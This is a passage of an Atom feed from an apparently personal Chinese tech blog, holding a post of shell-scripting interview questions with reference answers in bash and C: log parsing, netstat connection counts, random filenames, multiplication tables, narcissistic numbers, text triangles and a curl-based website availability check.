document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&amp;#x67E5;&amp;#x770B;&amp;#x6709;&amp;#x591A;&amp;#x5C11;&amp;#x8FDC;&amp;#x7A0B;&amp;#x7684;IP&amp;#x5728;&amp;#x8FDE;&amp;#x63A5;&amp;#x672C;&amp;#x673A;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;cod
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SHELL编程类面试题</title>
    <link href="https://marnm.github.io//posts/dbd9d26a/"/>
    <id>https://marnm.github.io//posts/dbd9d26a/</id>
    <published>2022-06-07T04:52:23.000Z</published>
    <updated>2022-06-07T05:04:35.990Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-&#x6709;&#x4E00;&#x4E2A;test-txt&#x6587;&#x672C;-&#x5185;&#x5BB9;&#x5982;&#x4E0B;-&#xFF0C;&#x8981;&#x6C42;&#x5C06;&#x6240;&#x6709;&#x57DF;&#x540D;&#x622A;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x7EDF;&#x8BA1;&#x91CD;&#x590D;&#x57DF;&#x540D;"><a href="#1-&#x6709;&#x4E00;&#x4E2A;test-txt&#x6587;&#x672C;-&#x5185;&#x5BB9;&#x5982;&#x4E0B;-&#xFF0C;&#x8981;&#x6C42;&#x5C06;&#x6240;&#x6709;&#x57DF;&#x540D;&#x622A;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x7EDF;&#x8BA1;&#x91CD;&#x590D;&#x57DF;&#x540D;" class="headerlink" title="1. &#x6709;&#x4E00;&#x4E2A;test.txt&#x6587;&#x672C;(&#x5185;&#x5BB9;&#x5982;&#x4E0B;)&#xFF0C;&#x8981;&#x6C42;&#x5C06;&#x6240;&#x6709;&#x57DF;&#x540D;&#x622A;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x7EDF;&#x8BA1;&#x91CD;&#x590D;&#x57DF;&#x540D;"></a>1. &#x6709;&#x4E00;&#x4E2A;test.txt&#x6587;&#x672C;(&#x5185;&#x5BB9;&#x5982;&#x4E0B;)&#xFF0C;&#x8981;&#x6C42;&#x5C06;&#x6240;&#x6709;&#x57DF;&#x540D;&#x622A;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x7EDF;&#x8BA1;&#x91CD;&#x590D;&#x57DF;&#x540D;</h3><blockquote><p>&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;&#x3002;<br><a href="https://www.baidu.com/index.html" target="_blank" rel="noopener">https://www.baidu.com/index.html</a><br><a href="https://www.jaking.com/index.html" target="_blank" rel="noopener">https://www.jaking.com/index.html</a><br><a href="https://www.sina.com.cn/1024.html" target="_blank" rel="noopener">https://www.sina.com.cn/1024.html</a><br><a href="https://www.jaking.com/2048.html" target="_blank" rel="noopener">https://www.jaking.com/2048.html</a><br><a href="https://www.sina.com.cn/4096.html" target="_blank" rel="noopener">https://www.sina.com.cn/4096.html</a><br><a href="https://www.jaking.com/8192.html" target="_blank" rel="noopener">https://www.jaking.com/8192.html</a></p></blockquote><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;:</strong><br><a id="more"></a></p><pre><code class="bash">cat test.txt | cut -d &quot;/&quot; -f 3 | sort | uniq -c | sort -nr# cut -d &#x6309;&#x7167;&#x5206;&#x9694;&#x7B26;&#x5206;&#x5272;# -f 3&#x622A;&#x53D6;&#x7B2C;&#x4E09;&#x5217;# uniq -c &#x663E;&#x793A;&#x6539;&#x884C;&#x91CD;&#x590D;&#x6B21;&#x6570;# sort -nr &#x6309;&#x7167;&#x6570;&#x5B57;&#x4ECE;&#x5927;&#x5230;&#x5C0F;&#x6392;&#x5217;</code></pre><h3 id="2-&#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x670D;&#x52A1;&#x5668;&#x6B63;&#x5728;&#x8FDE;&#x63A5;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6309;&#x8FDE;&#x63A5;&#x6B21;&#x6570;&#x6392;&#x5E8F;&#x3002;"><a href="#2-&#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x670D;&#x52A1;&#x5668;&#x6B63;&#x5728;&#x8FDE;&#x63A5;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6309;&#x8FDE;&#x63A5;&#x6B21;&#x6570;&#x6392;&#x5E8F;&#x3002;" class="headerlink" title="2. &#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x670D;&#x52A1;&#x5668;&#x6B63;&#x5728;&#x8FDE;&#x63A5;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6309;&#x8FDE;&#x63A5;&#x6B21;&#x6570;&#x6392;&#x5E8F;&#x3002;"></a>2. &#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x670D;&#x52A1;&#x5668;&#x6B63;&#x5728;&#x8FDE;&#x63A5;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6309;&#x8FDE;&#x63A5;&#x6B21;&#x6570;&#x6392;&#x5E8F;&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong></p><pre><code class="bash">netstat -ntup | grep -o [0-9].* | awk &apos;{print $3}&apos; | cut -d: -f 1 | sort | uniq -c | sort -rn# netstat -ntup &#x663E;&#x793A;TCP&#x548C;UDP&#x7684;&#x8FDE;&#x63A5;&#x72B6;&#x51B5;&#xFF0C;&#x4E14;&#x76F4;&#x63A5;&#x663E;&#x793A;IP&#x5730;&#x5740;&#xFF1B;# grep -o [0-9].* &#x53EA;&#x8F93;&#x51FA;&#x5339;&#x914D;&#x5230;&#x7684;&#x90E8;&#x5206;&#xFF0C;# awk &apos;{print $3}&apos; &#x9009;&#x62E9;&#x5339;&#x914D;&#x641C;&#x7D22;&#x5230;&#x7684;&#x7B2C;3&#x5217;# cut -d: -f1 &#x6307;&#x5B9A;&#x5206;&#x9694;&#x7B26; : &#x6307;&#x5B9A;&#x663E;&#x793A;&#x7B2C;1&#x4E2A;&#x5B57;&#x6BB5;# sort &#x9ED8;&#x8BA4;&#x5347;&#x5E8F;&#x6392;&#x5E8F;# uniq -c &#x7EDF;&#x8BA1;&#x5404;&#x884C;&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;# sort -rn  &#x6839;&#x636E;&#x6570;&#x5B57;&#x8FDB;&#x884C;&#x5012;&#x5E8F;&#x6392;&#x5E8F;</code></pre><h3 id="3-&#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x5728;-jaking&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;10&#x4E2A;txt&#x6587;&#x4EF6;&#xFF0C;&#x8981;&#x6C42;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x7531;6&#x4F4D;&#x968F;&#x673A;&#x5C0F;&#x3002;"><a href="#3-&#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x5728;-jaking&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;10&#x4E2A;txt&#x6587;&#x4EF6;&#xFF0C;&#x8981;&#x6C42;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x7531;6&#x4F4D;&#x968F;&#x673A;&#x5C0F;&#x3002;" class="headerlink" title="3. &#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x5728;/jaking&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;10&#x4E2A;txt&#x6587;&#x4EF6;&#xFF0C;&#x8981;&#x6C42;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x7531;6&#x4F4D;&#x968F;&#x673A;&#x5C0F;&#x3002;"></a>3. &#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x5728;/jaking&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;10&#x4E2A;txt&#x6587;&#x4EF6;&#xFF0C;&#x8981;&#x6C42;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x7531;6&#x4F4D;&#x968F;&#x673A;&#x5C0F;&#x3002;</h3><blockquote><p>&#x5199;&#x5B57;&#x6BCD;&#x52A0;&#x56FA;&#x5B9A;&#x5B57;&#x7B26;&#x4E32;&#xFF08;_nb&#xFF09;&#x7EC4;&#x6210;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;jk16ok_nb.txt&#x3002;</p></blockquote><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong></p><pre><code class="bash">#!/bin/bash# &#x68C0;&#x67E5;jaking&#x662F;&#x5426;&#x5B58;&#x5728;&#x5E76;&#x4E14;&#x662F;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;if [ ! -d /jaking ]    then    mkdir /jakingficd /jaking    # &#x8FDB;&#x5165;&#x6D4B;&#x8BD5;&#x76EE;&#x5F55;#&#x5FAA;&#x73AF;10&#x6B21;&#xFF0C;&#x6BCF;&#x6B21;&#x5FAA;&#x73AF;&#x5EFA;&#x7ACB;6&#x4F4D;&#x968F;&#x673A;&#x6570;&#x6587;&#x4EF6;for ((i=1;i&lt;=10;i++))    do    filename=$(tr -dc &apos;A-Za-z0-9&apos; &lt; /dev/urandom | head -c 6)    touch &quot;$filename&quot;_gg.txtdone# /dev/urandom &#x4E0E; /dev/random# /dev/urandom&#x975E;&#x963B;&#x585E;&#x968F;&#x673A;&#x6570;&#x53D1;&#x751F;&#x5668;&#xFF0C;&#x8BFB;&#x53D6;&#x64CD;&#x4F5C;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x963B;&#x585E;# /dev/random&#x5B58;&#x50A8;&#x7740;&#x7CFB;&#x7EDF;&#x5F53;&#x524D;&#x8FD0;&#x884C;&#x73AF;&#x5883;&#x7684;&#x5B9E;&#x65F6;&#x6570;&#x636E;&#xFF0C;&#x662F;&#x963B;&#x585E;&#x7684;&#x968F;&#x673A;&#x6570;&#x53D1;&#x751F;&#x5668;&#xFF0C;&#x8BFB;&#x53D6;&#x6709;&#x65F6;&#x9700;&#x8981;&#x7B49;&#x5F85;# &#x901A;&#x5E38;&#x4F7F;&#x7528;urandom&#x751F;&#x6210;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x4F7F;&#x7528;urandom&#x907F;&#x514D;&#x963B;&#x585E;</code></pre><h3 id="4-&#x7528;Shell&#x5199;99&#x4E58;&#x6CD5;&#x8868;&#x3002;"><a href="#4-&#x7528;Shell&#x5199;99&#x4E58;&#x6CD5;&#x8868;&#x3002;" class="headerlink" title="4. &#x7528;Shell&#x5199;99&#x4E58;&#x6CD5;&#x8868;&#x3002;"></a>4. &#x7528;Shell&#x5199;99&#x4E58;&#x6CD5;&#x8868;&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong></p><pre><code class="bash">#&#x65B9;&#x5F0F;&#x4E00;#!/bin/bashn=1while [ $n -lt 10 ]do      for (( m=1;m&lt;=$n;m++ ))      do        echo -n -e &quot;${m}x${n}=$[m*n]\t&quot;      doneechon=$((n+1))done#-----------------&#x6216;&#x8005;---------------------------n=9while [ $n -ge 1 ]do    for((i=1;i&lt;=$n;i++))    do        echo -n -e &quot;${i}x${n}=$[ n*i ]\t&quot;    doneecho#   echo $n    n=$((n-1))done######################################### &#x65B9;&#x5F0F;&#x4E8C;#!/bin/bashfor j in {1..9}do      for i in `seq $j`      do        echo -e -n &quot;${i}x${j}=$[ $i * $j ]\t&quot;      doneechodone# ---------------&#x6216;&#x8005;----------------------------for i in {9..1}do    for((j=1;j&lt;=$i;j++))    do        echo -e -n &quot;${j}x${i}=$[ i*j ]  &quot;    done    echodone</code></pre><h3 id="5-&#x5199;&#x51FA;1000&#x4EE5;&#x5185;&#x7684;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x3002;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF1A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A;-3-&#x4F4D;&#x6570;&#xFF0C;&#x5B83;&#x7684;&#x6BCF;&#x4E2A;&#x4F4D;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#x7684;-3&#x6B21;&#x5E42;&#x4E4B;&#x548C;&#x7B49;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;1-3-5-3-3-3-153&#xFF09;&#x3002;"><a href="#5-&#x5199;&#x51FA;1000&#x4EE5;&#x5185;&#x7684;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x3002;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF1A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A;-3-&#x4F4D;&#x6570;&#xFF0C;&#x5B83;&#x7684;&#x6BCF;&#x4E2A;&#x4F4D;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#x7684;-3&#x6B21;&#x5E42;&#x4E4B;&#x548C;&#x7B49;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;1-3-5-3-3-3-153&#xFF09;&#x3002;" class="headerlink" title="5. &#x5199;&#x51FA;1000&#x4EE5;&#x5185;&#x7684;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x3002;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF1A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A; 3 &#x4F4D;&#x6570;&#xFF0C;&#x5B83;&#x7684;&#x6BCF;&#x4E2A;&#x4F4D;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#x7684; 3&#x6B21;&#x5E42;&#x4E4B;&#x548C;&#x7B49;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;1^3 + 5^3+ 3^3 = 153&#xFF09;&#x3002;"></a>5. &#x5199;&#x51FA;1000&#x4EE5;&#x5185;&#x7684;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x3002;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF1A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A; 3 &#x4F4D;&#x6570;&#xFF0C;&#x5B83;&#x7684;&#x6BCF;&#x4E2A;&#x4F4D;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#x7684; 3&#x6B21;&#x5E42;&#x4E4B;&#x548C;&#x7B49;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;1^3 + 5^3+ 3^3 = 153&#xFF09;&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong></p><blockquote><p>  &#x6240;&#x8C13;&#x201D;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x201D;&#x662F;&#x6307;&#x4E00;&#x4E2A;&#x4E09;&#x4F4D;&#x6570;&#xFF0C;&#x5176;&#x5404;&#x4F4D;&#x6570;&#x5B57;&#x7ACB;&#x65B9;&#x548C;&#x7B49;&#x4E8E;&#x8BE5;&#x672C;&#x8EAB;&#x3002; &#x4F8B;&#x5982;&#xFF1A;153&#x662F;&#x4E00;&#x4E2A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;153=1^3+5^3+3^3&#x3002;</p></blockquote><pre><code class="bash">#!/bin/bash# &#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A;3&#x4F4D;&#x6570;&#xFF0C;&#x5176;&#x5404;&#x4F4D;&#x6570;&#x5B57;&#x7ACB;&#x65B9;&#x548C;&#x7B49;&#x4E8E;&#x8BE5;&#x672C;&#x8EAB;&#xFF0C;&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x4ECE;100&#x5F00;&#x59CB;&#x627E;&#xFF1A;for i in {100..1000}do      a=${i:0:1}      b=${i:1:1}      c=${i:2}      num=$[$a**3+$b**3+$c**3]      [ $num -eq $i ] &amp;&amp; echo &quot;water flower number is: $i&quot;done</code></pre><pre><code class="c">//&#x53C2;&#x8003;C&#x7684;&#x5199;&#x6CD5;//&#x65B9;&#x6CD5;&#x4E00;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;stdbool.h&gt;int cube(const int n){    return n*n*n;}boolisNarcissistic(const int n){//&#x5224;&#x65AD;&#x662F;&#x4E0D;&#x662F;&#x6C34;&#x4ED9;&#x82B1;&#x6570;    int hundreds=n/100;    int tens=n/10-hundreds*10;    int ones=n%10;    return cube(hundreds)+cube(tens)+cube(ones)==n;}int main(void){    int i;    for(i=100;i&lt;1000;++i){        if(isNarcissistic(i))        printf(&quot;%d\n&quot;,i);    }    return 0;}//=============================================////&#x65B9;&#x6CD5;&#x4E8C;#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;int main() {     int i,j,k,n;     printf(&quot;&apos;water flower&apos;number is:&quot;);     for(n=100;n&lt;1000;n++)     {         i=n/100;/*&#x5206;&#x89E3;&#x51FA;&#x767E;&#x4F4D;*/         j=n/10%10;/*&#x5206;&#x89E3;&#x51FA;&#x5341;&#x4F4D;*/         k=n%10;/*&#x5206;&#x89E3;&#x51FA;&#x4E2A;&#x4F4D;*/         if(n==i*i*i+j*j*j+k*k*k)         {             printf(&quot;%-5d&quot;,n);         }     }     printf(&quot;\n&quot;);    return 0;} </code></pre><h3 id="6-&#x83B7;&#x53D6;&#x968F;&#x673A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x3002;"><a href="#6-&#x83B7;&#x53D6;&#x968F;&#x673A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x3002;" class="headerlink" title="6. &#x83B7;&#x53D6;&#x968F;&#x673A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x3002;"></a>6. &#x83B7;&#x53D6;&#x968F;&#x673A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x3002;</h3><p><strong>&#x53C2;&#x8003;</strong></p><pre><code class="bash">#&#x4F7F;&#x7528;date &#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;date +%s%N | md5sum | head -c 8#&#x4F7F;&#x7528; /dev/urandom &#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;cat /dev/urandom | head -n 10 | md5sum | head -c 8</code></pre><p>&#x62D3;&#x5C55;&#xFF1A;</p><blockquote><p>&#x751F;&#x6210;&#x968F;&#x673A;&#x6570;<br>&#x53C2;&#x8003;&#xFF1A;<a href="https://doobom.me/random-string-number-in-shell" target="_blank" rel="noopener">https://doobom.me/random-string-number-in-shell</a></p></blockquote><h3 id="7-Shell&#x6279;&#x91CF;&#x8F6C;&#x6362;1-9&#x6210;&#x4E3A;01-09&#x3002;"><a href="#7-Shell&#x6279;&#x91CF;&#x8F6C;&#x6362;1-9&#x6210;&#x4E3A;01-09&#x3002;" class="headerlink" title="7. Shell&#x6279;&#x91CF;&#x8F6C;&#x6362;1-9&#x6210;&#x4E3A;01-09&#x3002;"></a>7. Shell&#x6279;&#x91CF;&#x8F6C;&#x6362;1-9&#x6210;&#x4E3A;01-09&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong></p><pre><code class="bash"># &#x65B9;&#x5F0F;&#x4E00;# &#x5339;&#x914D;&#x6BCF;&#x4E00;&#x4E2A;&#x5355;&#x8BCD;sed &apos;s:\w\+:0&amp;:g&apos;# &#x6539;&#x6210;&#x914D;&#x4EE5;&#x4EFB;&#x610F;&#x6570;&#x5B57;sed &apos;s/[0-9]/0&amp;/g&apos;  #&#x53EA;&#x80FD;&#x5339;&#x914D;1-9&#xFF0C;# &#x6269;&#x5C55;# &#x5982;&#x679C;&#x9700;&#x8981;&#x5339;&#x914D;9&#x4EE5;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#xFF0C;&#x53EF;&#x53EA;&#x5339;&#x914D;&#x884C;&#x9996;sed &apos;s/^[0-9]/0&amp;/g&apos;for i in {1..9}; do echo $i; done | sed &apos;s/[0-9]/0&amp;/g&apos;</code></pre><h3 id="8-Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x6B63;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;"><a href="#8-Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x6B63;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;" class="headerlink" title="8. Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x6B63;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;"></a>8. Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x6B63;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong></p><pre><code class="bash">#!/bin/bash# &#x7B80;&#x5355;&#x7C97;&#x66B4;&#x6CD5;echo &apos;    *&apos;;echo &apos;   ***&apos;;echo &apos;  *****&apos;;echo &apos; *******&apos;;echo &apos;*********&apos;;# for#!/bin/bashfor((i=1;i&lt;=8;i++))do     for((k=8;k&gt;i;k--))    do         echo -n &quot; &quot;   done    for((y=1;y&lt;=i;y++))    do         echo -n &quot;* &quot;   done    echo &apos;&apos;done  | sed &apos;s/ $//g&apos;####################################!/bin/bashfor((i=1;i&lt;=10;i++))do    for((j=10-i;j&gt;=1;j--))    do        printf &quot; &quot;    done    for((k=1;k&lt;=i;k++))    do        printf &quot;* &quot;    doneprintf &quot;\n&quot;done###############other######################a=&apos;          *&apos;;for i in `seq 1 10` ; do echo &quot;$a&quot;;a=$a&apos; *&apos;;a=${a:1}; done;################awk######################awk &apos;BEGIN{n=8;l=n*2-1;for(i=1;i&lt;=n;i++){    for(j=1;j&lt;=n-i;j++){        printf &quot; &quot;    }    for(k=1;k&lt;=i;k++){        printf &quot;* &quot;    }    print x    } }&apos;</code></pre><p>&#x53C2;&#x8003;C&#x683C;&#x5F0F;</p><pre><code class="c">#include &quot;stdio.h&quot;int main(){    int a,x,y,z;    scanf(&quot;%d&quot;,&amp;a); //&#x8F93;&#x5165;&#x9700;&#x8981;&#x6253;&#x5370;&#x7684;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x7684;&#x884C;&#x6570;    for(x=1;x&lt;=a;x++)   //&#x6253;&#x5370;&#x5217;    {        for(y=1;y&lt;=a-x;y++) //&#x6253;&#x5370;&#x7A7A;&#x683C;        {            printf(&quot; &quot;);        }        for(z=1;z&lt;=2*x-1;z++)   //&#x6253;&#x5370;*            printf(&quot;*&quot;);        printf(&quot;\n&quot;);    }}</code></pre><h3 id="9-Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x5012;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;"><a href="#9-Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x5012;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;" class="headerlink" title="9. Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x5012;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;"></a>9. Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x5012;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong></p><pre><code class="bash"># &#x7B80;&#x7B54;&#x7C97;&#x66B4;&#x6CD5;echo &apos;*********&apos;;echo &apos; *******&apos;;echo &apos;  *****&apos;;echo &apos;   ***&apos;;echo &apos;    *&apos;;###########################!/bin/bashfor(( i=0; i&lt;10; i++ ))do    for(( j=0; j&lt;i; j++))    do        printf &quot; &quot;;    done    for(( j=10-j; j&gt;0; j-- ))    do        printf &quot;* &quot;;    done    printf &quot;\n&quot;;done</code></pre><h3 id="10-&#x6279;&#x91CF;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#xFF0C;&#x8981;&#x6C42;&#x4F7F;&#x7528;she1l&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#xFF0C;&#x68C0;&#x6D4B;&#x7B56;&#x7565;&#x5C3D;&#x91CF;&#x6A21;&#x62DF;&#x7528;&#x6237;&#x771F;&#x5B9E;&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;&#x3002;"><a href="#10-&#x6279;&#x91CF;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#xFF0C;&#x8981;&#x6C42;&#x4F7F;&#x7528;she1l&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#xFF0C;&#x68C0;&#x6D4B;&#x7B56;&#x7565;&#x5C3D;&#x91CF;&#x6A21;&#x62DF;&#x7528;&#x6237;&#x771F;&#x5B9E;&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;&#x3002;" class="headerlink" title="10. &#x6279;&#x91CF;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#xFF0C;&#x8981;&#x6C42;&#x4F7F;&#x7528;she1l&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#xFF0C;&#x68C0;&#x6D4B;&#x7B56;&#x7565;&#x5C3D;&#x91CF;&#x6A21;&#x62DF;&#x7528;&#x6237;&#x771F;&#x5B9E;&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;&#x3002;"></a>10. &#x6279;&#x91CF;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#xFF0C;&#x8981;&#x6C42;&#x4F7F;&#x7528;she1l&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#xFF0C;&#x68C0;&#x6D4B;&#x7B56;&#x7565;&#x5C3D;&#x91CF;&#x6A21;&#x62DF;&#x7528;&#x6237;&#x771F;&#x5B9E;&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;&#x3002;</h3><blockquote><p><a href="https://www.jakingchuanqi.com" target="_blank" rel="noopener">https://www.jakingchuanqi.com</a><br><a href="https://www.163.com" target="_blank" rel="noopener">https://www.163.com</a><br><a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a></p></blockquote><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong></p><pre><code class="bash">#!/bin/bashweb=(https://www.jakingchuanqi.comhttps://www.163.comhttps://www.baidu.com1.1.1.1)    #&#x5B9A;&#x4E49;&#x6570;&#x7EC4;for i in ${web[*]} #&#x6309;&#x7167;&#x6570;&#x7EC4;&#x4E2D;&#x503C;&#x7684;&#x4E2A;&#x6570;&#x5FAA;&#x73AF;&#xFF0C;&#x6BCF;&#x6B21;&#x5FAA;&#x73AF;&#x628A;&#x6570;&#x7EC4;&#x4E2D;&#x503C;&#x8D4B;&#x4E88;&#x53D8;&#x91CF;ido    code=$( curl -o /dev/null -s --connect-timeout 5 -w &apos;%{http_code}&apos; $i | grep -E &quot;200|302&quot;)    #&#x68C0;&#x6D4B;curl&#x72B6;&#x6001;&#x7801;then    echo &quot;$i is ok&quot; &gt;&gt; /root/ok.logelse    # &#x53D8;&#x91CF;$code&#x503C;&#x4E3A;&#x7A7A;&#xFF0C;&#x5219;&#x4F11;&#x7720;10&#x79D2;&#xFF0C;&#x91CD;&#x65B0;&#x68C0;&#x6D4B;    sleep 10    code=$( curl -o /dev/null -s --connect-timeout 5 -w &apos;%{http_code}&apos; $i | grep -E &quot;200|302&quot;)if [ &quot;$code&quot; != &quot;&quot; ]then    echo &quot;$i is ok&quot; &gt;&gt; /root/ok.logelse    echo &quot;$i is error&quot; &gt;&gt; /root/error.logfifidone</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-有一个test-txt文本-内容如下-，要求将所有域名截取出来，并统计重复域名&quot;&gt;&lt;a href=&quot;#1-有一个test-txt文本-内容如下-，要求将所有域名截取出来，并统计重复域名&quot; class=&quot;headerlink&quot; title=&quot;1. 有一个test.txt文本(内容如下)，要求将所有域名截取出来，并统计重复域名&quot;&gt;&lt;/a&gt;1. 有一个test.txt文本(内容如下)，要求将所有域名截取出来，并统计重复域名&lt;/h3&gt;&lt;blockquote&gt;
